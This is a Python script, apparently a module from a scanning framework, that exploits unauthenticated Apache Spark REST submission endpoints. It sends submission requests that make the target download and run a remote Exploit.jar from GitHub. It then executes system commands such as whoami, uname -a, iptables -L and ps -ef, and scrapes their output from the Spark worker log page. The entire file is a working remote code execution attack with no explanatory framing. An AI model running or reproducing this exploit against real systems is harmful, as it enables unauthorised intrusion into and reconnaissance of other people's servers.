#-*-coding:utf-8-*-
import requests
import txconfig
import re
import time
import sys

def main(param):
    headers = txconfig.Request_Param.HEADERS
    result = {
        "success": False,
        "flag":{},
        "result": {}
    }
    try:
        url = param
    except Exception as e:
        result['result'] = e
        return result
    url_payload1 = ":6066/v1/submissions/create"
    cmd = ["whoami", "ls", "dir ","pwd", "uname -a","iptables -L", "route -n", "ps -ef", "chkconfig --lis"]
    lists = []
    for i in cmd:
        url = param
        payload = '{"action": "CreateSubmissionRequest","clientSparkVersion": "2.3.1","appArgs": ["'+ i +'"],"appResource": "https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar","environmentVariables": {"SPARK_ENV_LOADED": "1"},"mainClass": "Exploit","sparkProperties": {"spark.jars": "https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar","spark.driver.supervise": "false","spark.app.name": "Exploit","spark.eventLog.enabled": "true","spark.submit.deployMode": "cluster","spark.master": "spark://'+str(url)+':6066"}}'
        url_1 = url + url_payload1
        Re = requests.post(url_1, headers=headers,data = payload)
        Re_id = re.findall(r'submissionId" : "(.*)"',Re.text,re.M| re.I)[0]
        url_new = "%s:8081/logPage/?driverId=%s&logType=stdout" % (url,str(Re_id))
        time.sleep(5)
        Ree = requests.get(url_new, headers = headers)
        resu = re.findall(r''+ i +'\s([\S]+)\s',Ree.text,re.M | re.I)
        lists.append(resu)

    result['flag'] = lists
    result['success'] = True
    return result

if __name__ == '__main__':
    param = sys.argv[1]
    print main(param)